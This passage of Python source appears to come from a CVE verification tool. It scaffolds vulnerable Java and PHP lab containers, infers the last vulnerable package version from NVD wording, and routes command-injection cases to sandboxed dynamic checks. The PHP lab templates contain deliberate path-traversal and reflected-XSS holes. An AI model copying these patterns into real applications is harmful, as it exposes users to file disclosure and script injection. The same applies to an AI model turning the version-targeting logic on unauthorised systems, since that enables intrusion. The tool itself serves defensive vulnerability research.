            "import org.springframework.boot.autoconfigure.SpringBootApplication;\n"
            "import org.springframework.web.bind.annotation.*;\n"
            "import java.util.Map;\n\n"
            "@SpringBootApplication\n@RestController\n"
            "public class LabApp {\n"
            "    public static void main(String[] args) {\n"
            "        SpringApplication.run(LabApp.class, args);\n    }\n\n"
            f"    @GetMapping(\"/{endpoint}\")\n"
            f"    public Map<String, Object> exploit(@RequestParam(required=false) String {param}) {{\n"
            f"        return Map.of(\"status\", \"ok\", \"param\", ({param} != null ? {param} : \"\"),\n"
            f"                      \"canary\", \"BINORACLE_JAVA_{vuln_upper}_LAB\");\n"
            "    }\n\n"
            "    @GetMapping(\"/health\")\n"
            "    public String health() { return \"BINORACLE_JAVA_LAB_READY\"; }\n}\n"
        )

    with open(_os.path.join(lab_dir, "pom.xml"), "w") as f:
        f.write(pom_xml)
    with open(_os.path.join(src_dir, "LabApp.java"), "w") as f:
        f.write(controller_code)
    with open(_os.path.join(res_dir, "application.properties"), "w") as f:
        f.write("server.port=8080\nspring.application.name=binoracle-lab\n")

    try:
        from .genericverify import _proxy_dockerfile_lines as _pdl
        _proxy_lines = _pdl(lab_dir)
    except Exception:
        _proxy_lines = []

    # Inyectar CA cert en el Java truststore para que Maven pueda descargar deps via proxy
    _java_ca_lines = []
    if _proxy_lines:
        _java_ca_lines = [
            "RUN if [ -f /tmp/binoracle-ca.crt ]; then "
            "keytool -importcert -noprompt -alias binoracle-proxy "
            "-file /tmp/binoracle-ca.crt "
            "-keystore \"$(find /opt -name cacerts 2>/dev/null | head -1)\" "
            "-storepass changeit 2>/dev/null || true; fi",
        ]

    dockerfile = (
        "FROM maven:3.9-eclipse-temurin-11 AS build\n"
        + "\n".join(_proxy_lines) + ("\n" if _proxy_lines else "")
        + ("\n".join(_java_ca_lines) + "\n" if _java_ca_lines else "")
        + "WORKDIR /app\n"
        + "COPY pom.xml .\n"
        + "RUN mvn dependency:go-offline -q || true\n"
        + "COPY src ./src\n"
        + "RUN mvn package -DskipTests -q\n"
        + "FROM eclipse-temurin:11-jre\n"
        + "WORKDIR /app\n"
        + "COPY --from=build /app/target/*.jar app.jar\n"
        + "EXPOSE 8080\n"
        + 'CMD ["java", "-jar", "app.jar"]\n'
    )
    with open(_os.path.join(lab_dir, "Dockerfile"), "w") as f:
        f.write(dockerfile)

    notes.setdefault("http_method", "GET")
    notes.setdefault("endpoint", f"/{endpoint}")
    on_step(f"scaffolded Java/Maven lab at {lab_dir} ({group_id}:{artifact_id}:{dep_version}, vuln_class={vuln_class})")
    return lab_dir


def _scaffold_php_lab(target: str, version: str, vuln_class: str,
                      notes: dict, on_step) -> Optional[str]:
    """Crea /tmp/{pkg}_autonomous_lab con un Dockerfile PHP-Apache para CVEs de bibliotecas
    PHP standalone. Soporta PHPMailer, Monolog, Symfony, Laravel, Guzzle, Twig, etc.
    Devuelve la ruta del laboratorio o None si no se detecta un paquete PHP conocido."""
    import os as _os
    import json as _json
    pkg = (target or "").strip().lower()
    if not pkg or not _PHP_PKG_RE.search(pkg):
        return None

    lab_name = re.sub(r'[^a-z0-9]', '_', pkg)
    lab_dir = f"/tmp/{lab_name}_autonomous_lab"
    _os.makedirs(lab_dir, exist_ok=True)

    endpoint_base = ((notes.get("endpoint") or "").lstrip("/").split("?")[0] or "exploit")
    endpoint = endpoint_base if endpoint_base.endswith(".php") else endpoint_base + ".php"
    param = ""
    params = notes.get("parameters")
    if isinstance(params, list) and params:
        param = str(params[0])
    elif isinstance(params, str):
        param = params
    param = param or "payload"

    vuln_upper = vuln_class.upper().replace('-', '_')
    if vuln_class in ("rce", "command-injection"):
        php_code = (
            "<?php\n"
            "require_once __DIR__ . '/vendor/autoload.php';\n"
            f"$input = $_REQUEST['{param}'] ?? $_POST['cmd'] ?? '';\n"
            f"echo \"BINORACLE_PHP_{vuln_upper}_LAB\\n\";\n"
            "echo \"Input received: \" . htmlspecialchars($input) . \"\\n\";\n"
            "?>"
        )
    elif vuln_class == "path-traversal":
        php_code = (
            "<?php\n"
            "require_once __DIR__ . '/vendor/autoload.php';\n"
            f"$file = $_GET['{param}'] ?? 'index.html';\n"
            "echo \"BINORACLE_PHP_PATH_TRAVERSAL_LAB\\n\";\n"
            "$base = __DIR__ . '/files/';\n"
            "@readfile($base . $file);\n"
            "?>"
        )
        files_dir = _os.path.join(lab_dir, "files")
        _os.makedirs(files_dir, exist_ok=True)
        with open(_os.path.join(files_dir, "secret.txt"), "w") as f:
            f.write("BINORACLE_PHP_SECRET_FILE_CONTENTS\n")
    else:
        php_code = (
            "<?php\n"
            "require_once __DIR__ . '/vendor/autoload.php';\n"
            f"$input = $_REQUEST['{param}'] ?? '';\n"
            f"echo \"BINORACLE_PHP_{vuln_upper}_LAB\\n\";\n"
            "echo \"Reflected: \" . $input . \"\\n\";\n"
            "?>"
        )

    try:
        from .genericverify import _proxy_dockerfile_lines as _pdl
        _proxy_lines = _pdl(lab_dir)
    except Exception:
        _proxy_lines = []

    dockerfile = (
        "FROM php:8.1-apache\n"
        + "\n".join(_proxy_lines) + ("\n" if _proxy_lines else "")
        + "RUN curl -sS https://getcomposer.org/installer | php -- "
        "--install-dir=/usr/local/bin --filename=composer\n"
        + "WORKDIR /var/www/html\n"
        + "COPY composer.json .\n"
        + "RUN composer install --no-interaction --no-dev --prefer-dist 2>/dev/null || true\n"
        + f"COPY {endpoint} .\n"
        + "EXPOSE 80\n"
    )

    _json.dump({"require": {pkg: version or "*"}},
               open(_os.path.join(lab_dir, "composer.json"), "w"), indent=2)
    with open(_os.path.join(lab_dir, endpoint), "w") as f:
        f.write(php_code)
    with open(_os.path.join(lab_dir, "Dockerfile"), "w") as f:
        f.write(dockerfile)

    notes.setdefault("http_method", "GET")
    notes.setdefault("endpoint", f"/{endpoint}")
    on_step(f"scaffolded PHP lab at {lab_dir} ({pkg}:{version or 'latest'}, vuln_class={vuln_class})")
    return lab_dir


def _guess_package_lab(description: str, target_binary: str, vuln_class: str,
                       version: str, notes: dict, on_step) -> Optional[str]:
    """Punto de entrada unificado: detecta si es un paquete pip/npm por el target_binary
    o por la descripcion, y delega al scaffolder correspondiente. Devuelve la ruta del
    laboratorio o None si no se pudo inferir el paquete."""
    # Correccion critica: si la descripcion dice "Version X.Y.Z fixes this issue", el LLM
    # puede devolver X.Y.Z como affected_version, pero esa es la version PARCHEADA.
    # Confirmado en vivo con CVE-2024-23334 (aiohttp): descripcion dice "Version 3.9.2 fixes
    # this issue" -> LLM retorna affected_version=3.9.2 -> lab instala aiohttp==3.9.2 (la
    # version ya parcheada) -> el traversal no funciona nunca porque ya tiene la validacion.
    # Solucion: detectar el patron y decrementar al ultimo patch vulnerable (3.9.1).
    if description:
        # Recoge todas las versiones que la descripción NVD marca como "primera parcheada":
        # (a) "Version X.Y.Z fixes…" / "Versions X.Y.Z fixes…"
        # (b) "Prior to versions X.Y.Z" / "before version X.Y.Z" / "versions prior to X.Y.Z"
        _patched_ver_candidates: set = set()
        _m = _FIXES_THIS_VERSION_RE.search(description)
        if _m:
            # group(1): "Version X fixes…"; group(2): "is fixed in X" (new alt)
            _patched_ver_candidates.add(_m.group(1) or _m.group(2))
        for _pm in _PRIOR_TO_VERSION_RE.finditer(description):
            _clause = next((g for g in _pm.groups() if g), None)
            if _clause:
                for _vtoken in _VERSION_TOKENS_RE.findall(_clause):
                    _patched_ver_candidates.add(_vtoken)
        if version and version in _patched_ver_candidates:
            corrected = _decrement_patch_version(version)
            if corrected != version:
                _hint = next((m.group(0) for m in _PRIOR_TO_VERSION_RE.finditer(description)
                              if next((g for g in m.groups() if g), None) == version),
                             None) or (_m.group(0) if _m else description[:60])
                on_step((f"corrigiendo version: '{version}' es la version PARCHEADA segun la "
                         f"descripcion del CVE ('{_hint}') -- instalando "
                         f"'{corrected}' (ultima vulnerable)"))
                version = corrected
        elif not version and _patched_ver_candidates:
            # Sin version del LLM: inferir la ultima vulnerable decrementando la menor version
            # parcheada que indique la descripcion NVD (p.ej. "Prior to versions 2.2.13, 3.0.14"
            # -> la menor parcheada es 2.2.13 -> ultima vulnerable = 2.2.12).
            _sorted = sorted(_patched_ver_candidates,
                             key=lambda v: [int(x) for x in v.split(".") if x.isdigit()])
            _lowest_patched = _sorted[0] if _sorted else None
            if _lowest_patched:
                corrected = _decrement_patch_version(_lowest_patched)
                if corrected != _lowest_patched:
                    on_step((f"version inferida de descripcion CVE: '{_lowest_patched}' es la "
                             f"version parcheada -- instalando '{corrected}' (ultima vulnerable)"))
                    version = corrected

    # Si la descripcion menciona "WordPress" o "plugin for WordPress" / "plugin for WooCommerce",
    # esto es un plugin CMS que debe pasar por fetch_source(slug) + wpverify, no un pip lab.
    # Retornar None aqui evita que _guess_package_lab reemplace 'source' con un lab de psycopg2
    # cuando el LLM no incluyó una source_url explícita (source="") pero sí es un plugin WP.
    # Confirmado en vivo: CVE-2024-27956 (Automatic Migration) → description dice "WordPress
    # plugin" → _scaffold_pip_lab("automatic-migration") generaba lab con psycopg2 que fallaba
    # por ModuleNotFoundError y el contenedor nunca arrancaba.
    _desc_lower = (description or "").lower()
    _target_lower = (target_binary or "").lower()
    _is_wp_desc = ("wordpress" in _desc_lower or "woocommerce" in _desc_lower
                   or "wp plugin" in _desc_lower or " plugin for" in _desc_lower
                   or "drupal" in _desc_lower or "joomla" in _desc_lower)
    _is_wp_target = ("wordpress" in _target_lower or "woocommerce" in _target_lower
                     or _target_lower.startswith("wp-") or _target_lower.endswith("-wp"))
    if _is_wp_desc or _is_wp_target:
        return None

    candidate = (target_binary or "").strip().lower()
    # Apache httpd se chequea primero: es un binario, no un paquete pip/gem/npm.
    # La deteccion mira target_binary Y la descripcion para no depender de que el LLM
    # ponga exactamente "httpd" en target_binary (a veces pone "Apache HTTP Server").
    if vuln_class == "path-traversal":
        _apache_hit = (
            _APACHE_HTTPD_RE.search(candidate) if candidate else False
        ) or (
            _APACHE_HTTPD_RE.search(description) if description else False
        )
        if _apache_hit:
            lab = _scaffold_httpd_lab(version, notes, on_step)
            if lab:
                return lab
    # Si el LLM dijo target_binary, intenta directamente.
    # Ruby se chequea ANTES que pip: "rack" y otras gemas coinciden con el regex genérico pip.
    if candidate:
        # Ruby
        if _RUBY_GEM_RE.search(candidate):
            lab = _scaffold_gem_lab(candidate, version, vuln_class, notes, on_step)
            if lab:
                return lab
        # Node -- se chequea ANTES del pip generico porque muchos paquetes npm (glob, express,
        # etc.) pasan el regex pip ^[a-z][a-z0-9._-]+$ y se instalan como pip por error.
        if _NPM_PKG_RE.search(candidate):
            lab = _scaffold_npm_lab(candidate, version, vuln_class, notes, on_step)
            if lab:
                return lab
        # Python (el re.match generico cubre paquetes no listados en _PIP_PKG_RE)
        if _PIP_PKG_RE.search(candidate) or re.match(r'^[a-z][a-z0-9._-]+$', candidate):
            lab = _scaffold_pip_lab(candidate, version, vuln_class, notes, on_step)
            if lab:
                return lab
    # Fallback: busca en la descripcion
    if description:
        m = _RUBY_GEM_RE.search(description)
        if m:
            lab = _scaffold_gem_lab(m.group(1).lower(), version, vuln_class, notes, on_step)
            if lab:
                return lab
        m = _PIP_PKG_RE.search(description)
        if m:
            lab = _scaffold_pip_lab(m.group(1).lower(), version, vuln_class, notes, on_step)
            if lab:
                return lab
        m = _NPM_PKG_RE.search(description)
        if m:
            lab = _scaffold_npm_lab(m.group(1).lower(), version, vuln_class, notes, on_step)
            if lab:
                return lab
        # Paquetes npm con scope (@org/pkg) -- el regex principal no los cubre porque contienen '@'
        # y '/' que no son alfanumericos. Confirmado necesario con CVE-2026-55849 (@cyclonedx/npm).
        m = re.search(r'(@[a-z][a-z0-9._-]*/[a-z][a-z0-9._-]+)', description, re.IGNORECASE)
        if m:
            lab = _scaffold_npm_lab(m.group(1).lower(), version, vuln_class, notes, on_step)
            if lab:
                return lab
    return None


_VERSION_PATTERN = re.compile(r"^[0-9]+(?:[.\-][0-9A-Za-z]+)*$")
_VNUM = r"[vV]?([0-9]+(?:\.[0-9]+){0,4})"
# casuistica real de frases de rango de NVD/Patchstack (revisado a fondo, no solo el patron
# 'through X' que confirmo CVE-2024-27956) -- en todas, la version que importa para descargar
# el zip vulnerable es la del extremo SUPERIOR del rango, la mas reciente aun afectada:
#   - "from n/a through 3.92.0" / "2.1.3 to 2.8.2" (confirmados en vivo, los dos)
#   - "before 1.26" / "prior to 1.26" (NVD clasico)
#   - "up to 1.26" / "up to and including 1.26" (otra fraseologia comun)
#   - "<= 1.26" / "< 1.26" (notas terse CON espacio) / "<1.26" / "<=1.26" (confirmado en vivo,
#     CVE-2024-3552: 'affected_version': '<1.7.0' SIN espacio -- antes de este fix, al no hacer
#     match, se descargaba la version MAS RECIENTE del plugin (ya parcheada) en vez de la
#     vulnerable, y la verificacion dinamica nunca podia confirmar nada contra codigo arreglado)
#   - "1.0 - 2.0" / "1.0 – 2.0" / "1.0 — 2.0" (rango con guion/en-dash/em-dash, con o sin
#     espacios a los lados -- confirmado en vivo un PoC real transcribiendolo SIN espacios,
#     "2.1.3-2.8.2". No se confunde con un unico token tipo '1.0-beta1' porque ahi 'beta1' no
#     es un VNUM valido (no son solo digitos/puntos), asi que esa alternativa simplemente no
#     hace match y cae al chequeo de "ya es una version valida" de mas abajo)
_THROUGH_VERSION_RE = re.compile(
    rf"(?:(?:through|to|before|prior\s+to|up\s+to(?:\s+and\s+including)?)\s+|<=?\s*){_VNUM}"
    rf"|{_VNUM}\s*[-–—]\s*{_VNUM}")


def _clean_affected_version(raw: str) -> str:
    """Igual que _guess_wp_slug_from_description pero para la version: 'affected_version' en la
    hipotesis del LLM a veces es la FRASE libre de la descripcion del CVE ('from n/a through
    3.92.0'), no un numero de version limpio -- confirmado en vivo que, sin limpiar, eso rompe
    la URL de descarga con un error de bajo nivel confuso (el espacio no es valido en una URL).
    En vez de descartar el dato (la version SI es util: es la ultima version vulnerable, la que
    hay que descargar), se extrae con una regex sobre las frases de rango casi universales de
    estas descripciones. Si ya viene limpia, se devuelve tal cual; si no se reconoce nada, se
    devuelve vacio (mejor pedir la ultima version que mandar una cadena rota).

    El patron de RANGO se prueba ANTES del chequeo de "ya es una version valida" (confirmado en
    vivo: "2.1.3-2.8.2", un PoC transcribiendo un rango SIN espacios alrededor del guion, hacia
    match completo con _VERSION_PATTERN -- que solo exige digitos separados por puntos/guiones,
    sin distinguir un rango de dos versiones de una sola version con sufijo -- y se devolvia TAL
    CUAL, rompiendo la URL de descarga porque esa cadena no es ninguna version real que exista)."""
    raw = (raw or "").strip()
    if not raw:
        return ""
    m = _THROUGH_VERSION_RE.search(raw)
    if not m:
        # version ya limpia, posiblemente con un prefijo 'v'/'V' suelto ('v1.7.0', comun en
        # tags de git y en READMEs de PoC aunque NVD no lo use) -- se quita antes de devolverla,
        # ya que fetch_source/_looks_like_version exigen que empiece por un digito.
        unprefixed = raw[1:] if raw[:1] in ("v", "V") else raw
        if _VERSION_PATTERN.match(unprefixed):
            return unprefixed
    if m:
        # grupo 1: las frases con palabra clave (through/to/before/...). grupo 3: el extremo
        # SUPERIOR del rango con guion (grupo 2 es el inferior, nunca el que interesa aqui).
        return m.group(1) or m.group(3)
    return ""


_EXCLUSIVE_BOUND_RE = re.compile(r"\bbefore\b|\bprior\s+to\b|<(?!=)", re.IGNORECASE)

# Patrones NVD que indican que X.Y.Z es la PRIMERA versión PARCHEADA (no la vulnerable).
# El LLM suele copiar ese número tal cual como affected_version → hay que decrementar al
# último patch vulnerable (X.Y.Z-1).
# Casos reales confirmados:
#   "Version 3.9.2 fixes this issue"       (aiohttp, CVE-2024-23334)
#   "Prior to versions 2.2.13, 3.0.14, …"  (rack, CVE-2025-27610)
#   "before version 1.26"                  (phrasing clásica de NVD)
#   "versions prior to 5.1.0"              (variante de NVD/advisories)
_FIXES_THIS_VERSION_RE = re.compile(
    # (a) "Version 3.1.6 fixes…" / "Versions 3.1.6 fix…"
    r"[Vv]ersion[s]?\s+v?([0-9]+(?:\.[0-9]+){0,4})\s+fix"
    # (b) "is fixed in 3.1.6" / "fixed in version 3.1.6" (NVD short form)
    r"|(?:is\s+fixed\s+in|fixed\s+in(?:\s+version[s]?)?)\s+v?([0-9]+(?:\.[0-9]+){0,4})",
    re.IGNORECASE
)
_PRIOR_TO_VERSION_RE = re.compile(
    # "Prior to 3.1.6" / "Prior to version 3.1.6" / "Before 3.1.6" (version keyword optional)
    r"(?:[Pp]rior\s+to|[Bb]efore)\s+(?:version[s]?\s+)?"
    r"(v?[0-9]+(?:\.[0-9]+){1,4}(?:\s*,\s*(?:and\s+)?v?[0-9]+(?:\.[0-9]+){1,4})*)"
    r"|version[s]?\s+prior\s+to\s+"
    r"(v?[0-9]+(?:\.[0-9]+){1,4}(?:\s*,\s*(?:and\s+)?v?[0-9]+(?:\.[0-9]+){1,4})*)",
    re.IGNORECASE
)
_VERSION_TOKENS_RE = re.compile(r'v?([0-9]+(?:\.[0-9]+){1,4})')


def _decrement_patch_version(version: str) -> str:
    """'3.9.2' -> '3.9.1': decrementa el componente mas a la derecha que sea > 0."""
    parts = version.split(".")
    for i in range(len(parts) - 1, -1, -1):
        try:
            n = int(parts[i])
            if n > 0:
                parts[i] = str(n - 1)
                return ".".join(parts)
        except ValueError:
            break
    return version


def _affected_version_is_exclusive(raw: str) -> bool:
    """True si la frase ORIGINAL de version (antes de limpiar) usa un limite EXCLUSIVO -- 'before
    X'/'prior to X'/'<X' (NVD: versionEndExcluding, X ya esta PARCHEADA) -- en vez de uno
    INCLUSIVO -- 'through X'/'up to (and including) X'/'<=X'/un rango 'X - Y' (NVD:
    versionEndIncluding, X SI es la version vulnerable). Confirmado en vivo, CVE-2024-3552:
    'affected_version': '<1.7.0' es EXCLUSIVO -- descargar 1.7.0 tal cual trae la version YA
    ARREGLADA, no la vulnerable; hay que pedir la ultima version PUBLICADA antes de esa (ver
    exclusive_upper_bound en fetch_source/fetch_wordpress_plugin)."""
    return bool(raw) and bool(_EXCLUSIVE_BOUND_RE.search(raw))


def _run_web_investigation(inv: "Investigation", lang: str, step, llm=None,
                           budget_s: float = 300.0) -> None:
    """Rama WEB/APP de investigate_cve: descarga el codigo real si se puede, fundamenta la hipotesis
    del LLM contra el (grep de las funciones citadas) y desarrolla el PoC HTTP/HTML. Muta `inv` in
    place.

    `inv.verified` solo se pone a True en UN caso concreto, y por una prueba real: la clase es
    missing-authorization/idor, el codigo se descargo como plugin de WordPress, y hay Docker con
    daemon disponible -> wpverify.py levanta un WordPress+MySQL efimero, instala el plugin de
    verdad, inicia sesion como un usuario de bajo privilegio, envia la peticion, y confirma con un
    SEGUNDO login (con la password que la peticion fijo) que la cuenta objetivo quedo tomada. Fuera
    de ese caso (otra clase, sin Docker, sin plugin de WordPress...) nunca se marca verificado aqui:
    hace falta correr el PoC contra el objetivo autorizado real.

    `budget_s` es el presupuesto de verificacion dinamica (mismo --budget del CLI) -- bug real
    confirmado en vivo: antes de esto, SOLO se pasaba al camino --binary; cada verify_wordpress_*/
    verify_drupal_*/verify_joomla_* de aqui abajo ignoraba por completo lo que el analista pedia
    con --budget y usaba siempre su propio default interno (1200s/20min), fuera cual fuera el
    valor real pasado en la CLI."""
    es = lang == "es"
    from .websource import fetch_source, grep_vulnerable_functions, detect_required_companion_plugins
    from .webexploit import build_http_poc

    notes = inv.llm_notes or {}
    # CVE sobre una herramienta CLI LOCAL (sin servicio escuchando, sin endpoint HTTP) -- ver
    # cliverify.py, confirmado en vivo con CVE-2025-64756 (glob npm CLI). Reusa la clase
    # command-injection/os-command-injection de siempre (asi la clasifica classify_cve() sobre
    # la descripcion real del aviso, igual que para el caso web -- un vuln_class nuevo e
    # inventado aqui nunca ganaria: classify_cve(inv.description) se intenta ANTES que el hint
    # del analista en la asignacion de inv.vuln_class, ver mas abajo en investigate_cve). Lo que
    # distingue el caso CLI del caso web no es la clase, es la FORMA del objetivo: aqui no hay
    # endpoint, hay un comando de preparacion + un comando de ejecucion. Se resuelve aqui mismo y
    # se sale pronto: el resto de esta funcion (fetch_source de un plugin/modulo, grep de
    # funciones citadas, PoC HTTP...) no aplica a una herramienta sin endpoint ni codigo de
    # plugin que descargar -- el "source" aqui es el propio setup_cmd (p.ej. "npm install
    # glob@11.0.0"), no un repo/zip que fetch_source entienda.
    if (inv.vuln_class in ("command-injection", "os-command-injection")
            and notes.get("cli_setup_cmd") and notes.get("cli_run_cmd")):
        from .cliverify import verify_cli_filename_command_injection
        step(("intentando verificacion DINAMICA de una herramienta CLI local (sin endpoint "
             "HTTP): se prepara un entorno descartable, se planta un fichero cuyo nombre es el "
             "payload, y se ejecuta la herramienta tal cual la usaria un analista..." if es else
             "attempting DYNAMIC verification of a local CLI tool (no HTTP endpoint): a "
             "disposable environment is prepared, a file whose name is the payload is planted, "
             "and the tool is run exactly as an analyst would..."))
        wr = verify_cli_filename_command_injection(
            notes["cli_setup_cmd"], notes["cli_run_cmd"], on_step=step, budget_s=budget_s)
        _apply_wpverify_result(inv, wr, es, llm)
        return
    # SEGUNDA forma de CVE de herramienta CLI local: el payload va en el VALOR de un argumento
    # (no en un nombre de fichero) -- ver cliverify.verify_cli_argv_command_injection,
    # confirmado en vivo con CVE-2026-55849 (@cyclonedx/cyclonedx-npm). Gate explicito propio
    # (cli_argv_image/cli_argv/cli_payload_index), nunca adivinado de la forma de --params: un
    # analista que conoce el aviso es quien sabe que el vector es un argumento, no un fichero.
    if (inv.vuln_class in ("command-injection", "os-command-injection")
            and notes.get("cli_argv_image") and notes.get("cli_argv_setup")
            and notes.get("cli_argv") and notes.get("cli_payload_index") is not None):
        from .cliverify import verify_cli_argv_command_injection
        step(("intentando verificacion DINAMICA (Docker aislado, --network none) de una "
             "herramienta CLI cuyo vector es el VALOR de un argumento..." if es else
             "attempting DYNAMIC verification (isolated Docker, --network none) of a CLI tool "
             "whose vector is an argument's VALUE..."))
        wr = verify_cli_argv_command_injection(
            notes["cli_argv_image"], notes["cli_argv_setup"], list(notes["cli_argv"]),
            int(notes["cli_payload_index"]), on_step=step, budget_s=budget_s,
            setup_docker_args=notes.get("cli_argv_setup_docker_args"))
        _apply_wpverify_result(inv, wr, es, llm)
        return
    source = (notes.get("source_url") or "").strip()
    version_raw = (notes.get("affected_version") or "").strip()
    version = _clean_affected_version(version_raw)
    version_exclusive = _affected_version_is_exclusive(version_raw)
    if version_raw and not version:
        step((f"'{version_raw}' no tiene pinta de version real (parece texto libre de la "
             f"descripcion) y no se pudo extraer ninguna -- se sigue sin version concreta" )
             if es else
             (f"'{version_raw}' doesn't look like a real version (looks like free text from "
             f"the description) and none could be extracted -- continuing without a specific "
             f"version"))
    # Fallback determinista: si el LLM no extrajo la version afectada, intentar inferirla de la
    # descripcion NVD que casi siempre incluye "from n/a through X.Y.Z" o "before X.Y.Z".
    # Esto permite el chequeo de version en el fallback de slug '-wp' sin depender del LLM.
    if not version and inv.description:
        version = _clean_affected_version(inv.description)
        if version:
            version_exclusive = _affected_version_is_exclusive(inv.description)
    fn_names = notes.get("vulnerable_functions") or []
    if isinstance(fn_names, str):
        fn_names = [fn_names]

    guessed_source = False
    if not source:
        guess = _guess_wp_slug_from_description(inv.description)
        if guess:
            source = guess
            guessed_source = True
            step((f"el LLM no dio source_url; probando '{guess}' como slug de WordPress.org "
                 f"(extraido del propio texto del aviso, no una garantia)...") if es else
                 (f"the LLM gave no source_url; trying '{guess}' as a WordPress.org slug "
                 f"(extracted from the advisory text itself, not a guarantee)..."))

    # Fallback para CVEs de frameworks Python/Node: si no hay source_url ni slug de CMS,
    # construye un laboratorio minimal con el paquete pinado a la version vulnerable --
    # mismo mecanismo que los labs que antes se creaban a mano en /tmp para aiohttp/flask/etc.
    # EXTENSION: tambien se activa cuando el LLM dio una source_url que apunta al repo de la
    # propia libreria en GitHub (p.ej. github.com/pallets/jinja para CVE-2025-27516) -- ese
    # repo es el codigo fuente de la biblioteca, no una app desplegable, y genericverify no
    # tiene endpoint al que atacar. Para plugins de CMS la URL no es de GitHub o el nombre no
    # coincide con ningun paquete pip/npm/gem, por lo que _guess_package_lab devuelve None y
    # el comportamiento existente se preserva.
    if inv.vuln_class in (
            "path-traversal", "ssti", "sqli", "sql-injection",
            "command-injection", "missing-authorization", "xss", "ssrf"):
        _lab_candidate = _guess_package_lab(
            inv.description,
            (notes.get("target_binary") or "").strip(),
            inv.vuln_class, version, notes, step)
        # Tambien sustituye la source cuando el LLM retorno un especificador de paquete
        # pip (p.ej. "Flask-Reuploaded==1.4.0") en lugar de una URL -- fetch_source no
        # sabe como descargarlo y falla con "no parece una URL de git/zip".
        _is_pip_spec = bool(source and re.match(
            r'^[A-Za-z][A-Za-z0-9._-]*(?:==|>=|<=|~=|!=)\d', source))
        # Un "slug CMS" es un slug kebab-case sin protocolo ni separador de path:
        # "modal-survey", "kivicare-clinic-management-system", etc.
        # Cuando guessed_source=True y source ES un slug CMS, NO reemplazamos con un lab
        # pip generico -- el lab correcto para ese slug es el WP/Drupal con el plugin real.
        # Reemplazamos SOLO si: (a) no hay source, (b) source es GitHub (no desplegable),
        # (c) source es un especificador pip con version, o (d) guessed_source y el source
        # NO es un slug CMS bare (p.ej. description-only, source vacio, etc.).
        _guessed_cms_slug = (guessed_source and source
                             and not source.startswith("http")
                             and "/" not in source
                             and re.match(r'^[a-z][a-z0-9._-]+$', source))
        if _lab_candidate and (not source or (guessed_source and not _guessed_cms_slug)
                               or source.startswith("https://github.com/") or _is_pip_spec):
            source = _lab_candidate
            guessed_source = False  # lab scaffolded deterministically, no es una suposicion CMS

    # Detectar URLs de repos PoC de usuarios en GitHub (no el plugin real).
    # Patrón: github.com/<user>/<CVE-XXXX-XXXXX> -- el último segmento contiene "CVE-".
    # En ese caso el LLM se confundió y dio el PoC en vez del plugin: ignorar y buscar slug.
    # Confirmado en vivo: CVE-2023-28121 → LLM dio github.com/Secragon/CVE-2023-28121/
    # que no existe (repo privado/borrado), pero el slug real "woocommerce-payments" sí.
    if source:
        _src_last_seg = source.rstrip("/").split("/")[-1] if "://" in source else ""
        if re.match(r'(?i)^CVE-\d{4}-\d{4,}', _src_last_seg):
            step((f"'{source}' parece una URL de repo PoC (el segmento final es '{_src_last_seg}'), "
                  f"no el codigo fuente del plugin -- ignorando y buscando el slug real...") if es else
                 (f"'{source}' looks like a PoC repo URL (last segment is '{_src_last_seg}'), "
                  f"not the actual plugin source — skipping and looking for the real slug..."))
            # Intentar slug desde descripcion
            _slug_from_desc = _guess_wp_slug_from_description(inv.description)
            if _slug_from_desc:
                source = _slug_from_desc
                guessed_source = True
            else:
                source = ""  # nada que intentar; el motor seguira sin source

    if source:
        step(f"intentando obtener el codigo real ({source})..." if es else
             f"attempting to fetch the real source ({source})...")
        fr = fetch_source(source, version=version, on_step=step,
                         cms_hint=(notes.get("cms") or "").strip().lower(),
                         exclusive_upper_bound=version_exclusive)
        # confirmado en vivo (CVE-2025-9501, CVE-2024-3552): el LLM a veces da un source_url que
        # NO es ningun slug real -- una URL de GitHub inventada, o el mirror de otra org que no
        # es el repo oficial del plugin -- y fetch_source() falla descargandolo. Antes de esto,
        # el slug deducido de la descripcion SOLO se probaba cuando el LLM no daba source_url EN
        # ABSOLUTO (ver mas arriba); si dio algo, aunque fuera inservible, nunca se llegaba a
        # intentar el slug real -- dando por perdido el codigo cuando SI se podia haber obtenido.
        if not fr.ok and not guessed_source:
            # Paso 1: intentar el ultimo segmento de la URL fallida como slug de WordPress.org
            # ANTES que el guess basado en la descripcion del CVE. Razon: la descripcion suele
            # omitir el sufijo del slug real (p.ej. extrae 'error-log-viewer' de la descripcion
            # cuando el slug real en WordPress.org ES 'error-log-viewer-wp'). La URL que dio el
            # LLM ('https://github.com/wp-plugins/error-log-viewer-wp') contiene el slug correcto
            # como ultimo segmento de path -- si tiene forma de slug de WordPress, se prueba
            # primero y se evita descargar el plugin equivocado.
            from .websource import looks_like_wp_slug as _lwps
            _url_seg = source.rstrip("/").split("/")[-1] if source and "://" in source else ""
            if _url_seg and _lwps(_url_seg) and _url_seg != source:
                step((f"'{source}' no se pudo obtener ({fr.note}) -- probando primero "
                      f"'{_url_seg}' como slug de WordPress.org (extraido de la URL de "
                      f"origen)...") if es else
                     (f"'{source}' could not be fetched ({fr.note}) -- trying "
                      f"'{_url_seg}' first as a WordPress.org slug (extracted from the "
                      f"source URL)..."))
                fr_url_seg = fetch_source(_url_seg, version=version, on_step=step,
                                          cms_hint="wordpress",
                                          exclusive_upper_bound=version_exclusive)
                if fr_url_seg.ok:
                    fr = fr_url_seg
                    source = _url_seg
                    guessed_source = True
        # Fallback: si el slug CMS no se pudo descargar (404/etc.) pero hay un lab pip
        # scaffoldeado (disponible porque _guessed_cms_slug evitó que reemplazara source),
        # usarlo como última opción: mejor un lab Flask genérico que nada.
        _lab_candidate_fallback = locals().get("_lab_candidate")
        if not fr.ok and _lab_candidate_fallback:
            step((f"'{source}' no se pudo obtener -- usando lab generico como fallback "
                  f"({_lab_candidate_fallback})...") if es else
                 (f"'{source}' could not be fetched -- using generic lab fallback "
                  f"({_lab_candidate_fallback})..."))
            fr = fetch_source(_lab_candidate_fallback, version=version, on_step=step)
            if fr.ok:
                source = _lab_candidate_fallback
                guessed_source = False
        inv.source_fetch = {"ok": fr.ok, "kind": fr.kind, "source": fr.source,
                            "resolved_version": fr.resolved_version,
                            "local_path": fr.local_path, "note": fr.note,
                            "source_guessed_from_description": guessed_source}
        if fr.ok:
            # Si el LLM dio una URL de GitHub que sí existe (fr.kind="git") pero la descripción
            # del CVE menciona "WordPress plugin", el routing correcto es wordpress-plugin.
            # Intentar re-obtener usando el último segmento de la URL como slug de WordPress.org.
            # Confirmado necesario en vivo: CVE-2023-6567 (LearnPress) -- el LLM devuelve
            # github.com/LearnPress/learnpress, fetch_source clona ok con kind="git",
